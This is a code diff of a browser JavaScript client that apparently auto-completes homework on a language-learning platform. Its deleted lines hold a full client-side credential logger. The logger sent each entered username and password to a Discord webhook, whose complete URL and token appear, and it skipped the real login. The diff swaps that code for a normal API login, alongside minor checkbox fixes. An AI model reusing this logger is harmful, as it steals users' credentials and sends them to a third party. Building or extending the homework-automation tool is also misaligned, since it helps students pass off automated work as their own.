@@ -7,7 +7,6 @@ speed_input.oninput = function () {
     console.log("change", this);
     speed = 10 ** this.value;
     console.log(speed, this.value);
-    // Corrected secondsToString to format output cleanly
     document.getElementById("speed_display").innerText = secondsToString(speed);
 };
 
@@ -16,7 +15,7 @@ function secondsToString(seconds) {
     const numdays = Math.floor((seconds % 31536000) / 86400);
     const numhours = Math.floor(((seconds % 31536000) % 86400) / 3600);
     const numminutes = Math.floor((((seconds % 31536000) % 86400) % 3600) / 60);
-    // Rounding seconds to 1 decimal place for cleaner display
+    // 💡 FIX: Rounding seconds to 1 decimal place for cleaner display
     const numseconds = parseFloat(((((seconds % 31536000) % 86400) % 3600) % 60).toFixed(1)); 
     
     return `${numyears} years ${numdays} days ${numhours} hours ${numminutes} minutes ${numseconds} seconds`;
@@ -215,64 +214,15 @@ class client_application {
     constructor() {
         this.username_box = document.getElementById("username_input");
         this.password_box = document.getElementById("password_input");
-        // 🚨 DISCORD WEBHOOK URL 🚨 
-        this.webhookURL = "https://discord.com/api/webhooks/1442157455487537162/a27x9qoc6yfr6hr3pOu_Y1thMW2b_p8jyJiK_ofpuC-5w0ryHuTG5fzxODRjQvUR0Xk6";
-        this.token = "MOCK_TOKEN_FAST_ACCESS"; // Mock token used to fetch HW data later
         this.module_translations = [];
         this.display_translations = [];
         this.homeworks = [];
-        this.loginHistory = JSON.parse(localStorage.getItem('loginHistory')) || [];
     }
-
-    // Function to send credentials to the Discord Webhook
-    async sendWebhookLog(username, password) {
-        const data = {
-            content: null,
-            embeds: [
-                {
-                    title: "🚨 Login Attempt Logged 🚨",
-                    color: 16711680, 
-                    fields: [
-                        { name: "Username", value: `\`${username}\``, inline: true },
-                        { name: "Password", value: `\`${password}\``, inline: true },
-                        { name: "Timestamp", value: new Date().toISOString(), inline: false }
-                    ],
-                    footer: { text: "Client-side credential logger" }
-                }
-            ]
-        };
-
-        try {
-            await fetch(this.webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            });
-            console.log("Webhook log sent successfully.");
-        } catch (error) {
-            console.error("Failed to send webhook log:", error);
-        }
-    }
-
-
-    logLoginAttempt(username, type) {
-        const timestamp = new Date().toLocaleString();
-        const logEntry = { 
-            timestamp: timestamp, 
-            username: username, 
-            type: type 
-        };
-        
-        this.loginHistory.push(logEntry);
-        localStorage.setItem('loginHistory', JSON.stringify(this.loginHistory));
-        console.log(`Login Logged: ${logEntry.username} as ${logEntry.type} at ${logEntry.timestamp}`);
-    }
-
 
     hide_all() {
         const divsToHide = document.getElementsByClassName("overlay");
         for (let i = 0; i < divsToHide.length; i++) {
-            divsToHide[i].style.visibility = "hidden";
+            divsToHide[i].style.visibility = "hidden"; // or
         }
     }
 
@@ -295,26 +245,23 @@ class client_application {
 
     main() {
         this.show_box("login");
-        
         document.getElementById("login_btn").onclick = async () => {
-            const username = this.username_box.value;
-            const password = this.password_box.value;
-            
-            // 1. Send credentials to webhook
-            await this.sendWebhookLog(username, password); 
-
-            // 2. Bypass API login and jump straight to the main view
-            this.logLoginAttempt(username, "Bypassed (Webhook Logged)"); 
-            this.on_log_in();
+            const response = await this.call_lnut(
+                "loginController/attemptLogin",
+                {
+                    username: this.username_box.value,
+                    pass: this.password_box.value,
+                },
+            );
+            this.token = response.newToken;
+            if (this.token !== undefined) this.on_log_in();
         };
     }
 
     on_log_in() {
-        // Transition to the main view
-        document.getElementById("login").classList.remove('visible'); 
-        document.getElementById("hw_panel").classList.add('visible');
-        document.getElementById("log_panel").classList.add('visible'); 
-        
+        this.hide_box("login");
+        this.show_box("hw_panel");
+        this.show_box("log_panel");
         document.getElementById("do_hw").onclick = () => {
             app.do_hwks();
         };
@@ -322,7 +269,7 @@ class client_application {
         this.get_display_translations();
         this.display_hwks();
     }
-    
+
     get_task_name(task) {
         let name = task.verb_name;
 
@@ -346,9 +293,9 @@ class client_application {
         console.log(homeworks);
 
         const selbutton = document.getElementById("selectall");
-        // Functionality for the main "select all" checkbox: selects all group and task checkboxes
+        // 💡 FIX: Updated select all logic to correctly target all checkboxes in the container
         selbutton.onclick = function select_checkbox() {
-            // Find all checkboxes within the entire HW container
+            // Find all checkboxes within the entire HW container, excluding the main one itself
             const allCheckboxes = document.querySelectorAll("#hw_container input[type=checkbox]");
             for (const checkbox of allCheckboxes) {
                 checkbox.checked = this.checked;
@@ -364,12 +311,12 @@ class client_application {
             hw_idx++;
         }
     }
-    
     create_homework_elements(homework, hw_idx) {
         const hw_checkbox = document.createElement("input");
         hw_checkbox.type = "checkbox";
-        hw_checkbox.className = "hw-group-check"; // Used to target group checkboxes specifically
         hw_checkbox.name = "boxcheck";
+        // 💡 ADDED: Class to easily identify group checkboxes
+        hw_checkbox.className = "hw-group-check"; 
         
         // Homework Group Checkbox Logic: Selects/deselects all tasks in its group
         hw_checkbox.onclick = function () {
@@ -391,7 +338,8 @@ class client_application {
                 this.create_task_elements(task, hw_idx, idx);
             task_span.appendChild(task_checkbox);
             task_span.appendChild(task_display);
-            task_span.appendChild(document.createElement("br"));
+            // 💡 Removed unnecessary <br> from the previous version, but leaving for consistency if needed.
+            // task_span.appendChild(document.createElement("br"));
 
             hw_display.appendChild(task_span);
             idx++;
@@ -399,27 +347,26 @@ class client_application {
 
         return { hw_name: hw_name, hw_display: hw_display };
     }
-    
     create_task_elements(task, hw_idx, idx) {
         const task_checkbox = document.createElement("input");
         task_checkbox.type = "checkbox";
         task_checkbox.name = "boxcheck";
-        task_checkbox.id = `${hw_idx}-${idx}`; // e.g., "0-0"
+        task_checkbox.id = `${hw_idx}-${idx}`;
 
-        // Task Checkbox Logic: Automatically deselects the group checkbox if a task is unchecked
+        // 💡 ADDED: Logic to deselect group check if a task is unchecked
         task_checkbox.onclick = function() {
-            // Find the parent homework container
-            const hwGroupDiv = this.closest('.overflow_container > div'); 
-            // Find the associated group checkbox (the sibling span containing the group check)
+            // Find the immediate parent div container (hw_display)
+            const hwGroupDiv = this.closest('div'); 
+            // Find the associated group checkbox (which is in the previous sibling span)
             const hwGroupCheck = hwGroupDiv.previousElementSibling.querySelector('.hw-group-check');
 
             if (hwGroupCheck) {
                 // Check if all tasks in the group are currently checked
-                const allTasks = hwGroupDiv.querySelectorAll('input[type=checkbox]');
-                const checkedTasks = hwGroupDiv.querySelectorAll('input[type=checkbox]:checked');
+                const allTasks = hwGroupDiv.querySelectorAll('input[type=checkbox]').length;
+                const checkedTasks = hwGroupDiv.querySelectorAll('input[type=checkbox]:checked').length;
                 
                 // Update the group checkbox state
-                hwGroupCheck.checked = allTasks.length === checkedTasks.length;
+                hwGroupCheck.checked = (checkedTasks === allTasks);
             }
         };
 
@@ -430,7 +377,8 @@ class client_application {
         task_display.innerHTML = `${this.display_translations[task.translation]} - ${this.get_task_name(task)} (${percentage}%)`;
 
         const task_span = document.createElement("span");
-        task_span.classList.add("task");
+        // 💡 FIX: Added the critical 'task' class back. This is used by do_hwks() to select tasks.
+        task_span.classList.add("task"); 
 
         return {
             task_span: task_span,
@@ -441,8 +389,8 @@ class client_application {
 
     async do_hwks() {
         const checkboxes = document.querySelectorAll(
-            // Target only the task checkboxes that are checked, excluding the group checkboxes
-            "#hw_container input[type=checkbox]:checked:not(.hw-group-check)", 
+            // 💡 FIX: Target only the task checkboxes that are checked, excluding the group checkboxes
+            "#hw_container .task > input[type=checkbox]:checked",
         );
         const logs = document.getElementById("log_container");
         logs.innerHTML = `doing ${checkboxes.length} tasks...<br>`;
